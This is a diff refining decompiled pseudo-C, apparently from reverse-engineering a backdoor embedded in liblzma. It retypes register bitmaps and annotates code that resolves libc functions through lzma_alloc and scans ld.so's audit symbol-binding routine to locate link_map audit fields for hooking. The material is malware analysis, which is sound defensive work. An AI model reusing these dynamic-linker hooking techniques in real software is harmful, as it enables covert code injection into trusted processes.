@@ -20,7 +20,7 @@ BOOL find_link_map_l_audit_any_plt
 
 {
   libc_imports_t *libc_imports;
-  u32 mask_filter_snapshot;
+  instruction_register_bitmap_t output_register_snapshot;
   u64 decoded_insn_size;
   BOOL telemetry_ok;
   lzma_allocator *libc_allocator;
@@ -36,8 +36,8 @@ BOOL find_link_map_l_audit_any_plt
   uchar mask_reg_index;
   dl_audit_symbind_alt_fn audit_func_end;
   u8 wipe_stride;
-  u32 mask_register_bitmap;
-  u32 output_register_bitmap;
+  instruction_register_bitmap_t mask_register_bitmap;
+  instruction_register_bitmap_t output_register_bitmap;
   instruction_search_ctx_t search_ctx;
   dasm_ctx_t insn_ctx;
   
@@ -51,23 +51,23 @@ BOOL find_link_map_l_audit_any_plt
       *(u32 *)&insn_ctx_wipe_cursor->instruction = 0;
       insn_ctx_wipe_cursor = (dasm_ctx_t *)((long)insn_ctx_wipe_cursor + (ulong)wipe_stride * -8 + 4);
     }
-    mask_register_bitmap = 0;
-    output_register_bitmap = 0;
+    mask_register_bitmap.raw_value = 0;
+    output_register_bitmap.raw_value = 0;
     libc_allocator = get_lzma_allocator();
     libc_allocator->opaque = data->cached_elf_handles->libc;
     write_stub_alloc = (pfn_write_t)lzma_alloc(0x380,libc_allocator);
-    mask_filter_snapshot = output_register_bitmap;
+    output_register_snapshot = output_register_bitmap;
     libc_imports->write = write_stub_alloc;
     if (write_stub_alloc != (pfn_write_t)0x0) {
       libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
     }
     audit_func_cursor = (hooks->ldso_ctx)._dl_audit_symbind_alt;
-    mask_register_bitmap._0_3_ = CONCAT12(0xff,(ushort)mask_register_bitmap);
-    mask_register_bitmap = CONCAT22(mask_register_bitmap._2_2_,(ushort)mask_register_bitmap) | 0x80;
-    output_register_bitmap._0_2_ = (ushort)output_register_bitmap | 2;
+    mask_register_bitmap.fields.reg_index = 0xff;
+    mask_register_bitmap.raw_value = CONCAT22(mask_register_bitmap.raw_value._2_2_,mask_register_bitmap.fields.allowed_regs) | 0x80;
+    output_register_bitmap.fields.allowed_regs = output_register_bitmap.fields.allowed_regs | 2;
     audit_func_end = audit_func_cursor + (hooks->ldso_ctx)._dl_audit_symbind_alt__size;
-    output_register_bitmap._3_1_ = SUB41(mask_filter_snapshot,3);
-    output_register_bitmap._0_3_ = CONCAT12(0xff,(ushort)output_register_bitmap);
+    output_register_bitmap.fields.reserved = output_register_snapshot.fields.reserved;
+    output_register_bitmap.fields.reg_index = 0xff;
     pselect_stub_alloc = (pfn_pselect_t)lzma_alloc(0x690,libc_allocator);
     libc_imports->pselect = pselect_stub_alloc;
     if (pselect_stub_alloc != (pfn_pselect_t)0x0) {
@@ -121,31 +121,32 @@ BOOL find_link_map_l_audit_any_plt
               search_ctx_wipe_cursor = (instruction_search_ctx_t *)((long)search_ctx_wipe_cursor + (ulong)wipe_stride * -8 + 4);
             }
             // AutoDoc: Whichever register we see first becomes `output_register_to_match`; the companion bitmap is treated as the AND-mask source so they stay paired.
-            if (((int)(mask_register_bitmap & 0xffff) >> (mask_reg_index & 0x1f) & 1U) == 0) {
-              if (((int)(output_register_bitmap & 0xffff) >> (mask_reg_index & 0x1f) & 1U) == 0) goto LAB_00104fd8;
-              output_register_bitmap._0_3_ = CONCAT12(l_name_reg_index,(ushort)output_register_bitmap);
-              search_ctx_zero_cursor = (u32 *)((long)&search_ctx.offset_to_match + 4);
+            if (((int)(mask_register_bitmap.raw_value & 0xffff) >> (mask_reg_index & 0x1f) & 1U) == 0) {
+              if (((int)(output_register_bitmap.raw_value & 0xffff) >> (mask_reg_index & 0x1f) & 1U) == 0)
+              goto LAB_00104fd8;
+              output_register_bitmap.fields.reg_index = l_name_reg_index;
+              search_ctx_zero_cursor = &search_ctx.offset_to_match.dwords.reserved;
               for (wipe_idx = 7; wipe_idx != 0; wipe_idx = wipe_idx + -1) {
                 *search_ctx_zero_cursor = 0;
                 search_ctx_zero_cursor = search_ctx_zero_cursor + (ulong)wipe_stride * -2 + 1;
               }
               search_ctx.output_register_to_match = &output_register_bitmap;
-              search_ctx.output_register = (u8 *)&mask_register_bitmap;
+              search_ctx.output_register = &mask_register_bitmap;
             }
             else {
-              mask_register_bitmap._0_3_ = CONCAT12(l_name_reg_index,(ushort)mask_register_bitmap);
-              search_ctx_zero_cursor = (u32 *)((long)&search_ctx.offset_to_match + 4);
+              mask_register_bitmap.fields.reg_index = l_name_reg_index;
+              search_ctx_zero_cursor = &search_ctx.offset_to_match.dwords.reserved;
               for (wipe_idx = 7; wipe_idx != 0; wipe_idx = wipe_idx + -1) {
                 *search_ctx_zero_cursor = 0;
                 search_ctx_zero_cursor = search_ctx_zero_cursor + (ulong)wipe_stride * -2 + 1;
               }
               search_ctx.output_register_to_match = &mask_register_bitmap;
-              search_ctx.output_register = (u8 *)&output_register_bitmap;
+              search_ctx.output_register = &output_register_bitmap;
             }
             // AutoDoc: Seed the instruction search context immediately after the LEA and hand it to `find_link_map_l_audit_any_plt_bitmask` to capture the mask bit + slot offset.
             search_ctx.start_addr = (u8 *)(audit_func_cursor + decoded_insn_size);
             search_ctx.end_addr = (u8 *)audit_func_end;
-            search_ctx.offset_to_match._0_4_ = (int)lea_operand_disp;
+            search_ctx.offset_to_match.dwords.offset = (u32)lea_operand_disp;
             search_ctx.hooks = hooks;
             search_ctx.imported_funcs = imported_funcs;
             telemetry_ok = find_link_map_l_audit_any_plt_bitmask(data,&search_ctx);
